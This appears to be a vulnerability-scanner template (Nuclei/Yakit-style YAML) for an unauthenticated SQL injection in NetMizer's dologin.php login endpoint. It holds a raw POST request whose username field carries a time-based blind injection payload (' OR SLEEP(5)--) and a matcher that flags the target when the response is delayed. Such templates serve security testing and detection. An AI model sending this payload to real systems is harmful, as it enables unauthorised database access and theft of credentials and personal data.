content:
id: XVE-2024-37672

info:
  name: NetMizer dologin.php sql注入漏洞
  author: Deans
  severity: high
  description: NetMizer 在/dologin.php接口存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息(例如管理员后台密码、站点用户个人信息)之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 28b75eddbecd69df786eafd0e6b06197

http:
- raw:
  - |-
    @timeout: 30s
    POST /data/login/dologin.php HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    action=login&username=' OR SLEEP(5)-- qAZp&passwd=1

  max-redirects: 3
  disable-cookie: true
  matchers-condition: and
  matchers:
  - id: 1
    type: dsl
    part: body
    dsl:
    - duration > 5
    condition: and
